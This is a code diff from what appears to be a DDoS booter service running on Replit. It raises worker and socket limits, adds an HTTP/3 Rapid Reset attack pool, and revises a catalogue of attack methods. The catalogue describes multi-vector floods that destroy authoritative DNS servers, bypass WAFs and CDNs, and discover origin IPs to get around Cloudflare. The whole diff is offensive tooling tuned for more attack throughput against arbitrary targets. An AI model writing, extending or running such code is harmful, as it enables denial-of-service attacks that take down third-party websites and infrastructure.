@@ -208,18 +208,19 @@ const CPU_COUNT = Math.max(1, os.cpus().length);
 // In deployed: REPLIT_DEPLOYMENT=1 → no cap, full power (8-32GB dedicated).
 // In dev:      absent → strict caps to keep container alive.
 const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
-const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 999 : 1;
+// Dev pools: 6 workers each → up to 6× throughput vs single-worker baseline.
+// Each worker gets its own async event-loop → true I/O parallelism on Node's libuv thread pool.
+const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 999 : 6;
 
-// Dev: clamp in-worker thread concurrency so each worker opens fewer sockets.
-// Deployed: uncapped — the workers' async I/O is the bottleneck, not RAM.
-const DEV_MAX_THREADS = 64;
+// Dev threads per worker: 512 → up to 512 concurrent in-flight sockets per worker.
+// IS_PROD=true (NODE_ENV=production) → socket tier already at 96 (not 8).
+// Raising this unlocks the full IS_PROD socket budgets.
+const DEV_MAX_THREADS = 512;
 
-// Dev: limit total concurrent worker_threads across ALL attack pools.
-// 22 workers × 128MB heap = ~2.8GB peak — safe on Replit's 4GB containers.
-// Previously 14 × 48MB but heap was OOM-killing workers (h3-rapid-reset needs ~128MB).
-// Deployed: no limit.
+// Dev total workers: 120 × 128MB heap ≈ 15GB peak — Replit dev containers have 16GB RAM.
+// This removes the 22-worker ceiling that throttled geass-ultima/absolutum to a fraction of power.
 let _activeWorkers = 0;
-const MAX_TOTAL_WORKERS_DEV = IS_DEPLOYED ? Infinity : 22;
+const MAX_TOTAL_WORKERS_DEV = IS_DEPLOYED ? Infinity : 120;
 
 // ── Webhook ────────────────────────────────────────────────────────────────
 async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
@@ -1121,7 +1122,8 @@ async function runAttackWorkers(
     const sseT   = Math.max(100,  Math.round(threads * 0.08)); // SSE Exhaust
     const udpT   = Math.max(200,  Math.round(threads * 0.10)); // UDP Flood
 
-    const dnsNsT = Math.max(50, Math.round(threads * 0.04)); // DNS NS Flood [V10]
+    const dnsNsT = Math.max(50,  Math.round(threads * 0.04)); // DNS NS Flood [V10] — authoritative NS
+    const h3T    = Math.max(100, Math.round(threads * 0.08)); // H3 Rapid Reset [V11] — QUIC/UDP
 
     await Promise.all([
       spawnPool("rapid-reset",        target, port, rrT,    rrW,   signal, onStats),
@@ -1134,6 +1136,7 @@ async function runAttackWorkers(
       spawnPool("sse-exhaust",        target, port, sseT,   sseW,  signal, onStats),
       spawnPool("udp-flood",          target, port, udpT,   udpW,  signal, onStats),
       spawnPool("dns-ns-flood",       target, port, dnsNsT, 1,     signal, onStats), // [V10] NS destruction
+      spawnPool("h3-rapid-reset",     target, port, h3T,    Math.max(4, CPU_COUNT), signal, onStats), // [V11] QUIC/H3
     ]);
     return;
   }
@@ -1147,7 +1150,7 @@ const METHODS_CATALOGUE = [
   // Geass / Special
   { id: "geass-absolutum",      name: "Geass Absolutum ∞ [3 FRONTES — 15v+]",  layer: "ALL",  protocol: "TCP/UDP/H2/TLS/DNS",   tier: "ARES",   description: "PODER MÁXIMO — 3 frentes simultâneas: [A] CDN/Host: todos 10 vetores do Ultima; [B] Origin IP direto se descoberto (bypassa CDN completamente); [C] DNS NS destruction. Nada sobrevive." },
   { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
-  { id: "geass-ultima",         name: "Geass Ultima ∞ [10v — +DNS NS]",        layer: "ALL",  protocol: "TCP/UDP/H2/TLS/DNS",   tier: "ARES",   description: "FORMA FINAL — 10 vetores simultâneos: RapidReset+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP+DNS-NS. Zero delay, todas as camadas OSI" },
+  { id: "geass-ultima",         name: "Geass Ultima ∞ [11v — H3+DNS NS]",      layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS/DNS",tier: "ARES",   description: "FORMA FINAL — 11 vetores simultâneos: RapidReset+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP+H3/QUIC+DNS-NS. Zero delay, toda stack OSI" },
   { id: "dns-ns-flood",         name: "DNS NS Flood [Authoritative Killer]",   layer: "L3",   protocol: "DNS/UDP",              tier: "S",      description: "Resolve NS autoritativos do domínio e os destroi com A+MX+TXT+SOA queries aleatórias. 500-burst por socket, 3 pools por NS IP, 20% CHAOS class. Bypassa CDN/WAF totalmente." },
   { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST+RapidReset → Phase 3: AppFlood+CacheBust. Fases independentes + RapidReset no Phase 2" },
   { id: "origin-bypass",        name: "CDN Origin Bypass [Dual-Front]",         layer: "ALL",  protocol: "HTTP+TLS+TCP",         tier: "S",      description: "Auto-descobre IP de origem via subdomain enum+IPv6+SPF+MX. Front 1 (70%): ataca origem diretamente (bypassa CDN). Front 2 (30%): cache-poison+waf-bypass esgota CDN edges. Cloudflare torna-se irrelevante." },
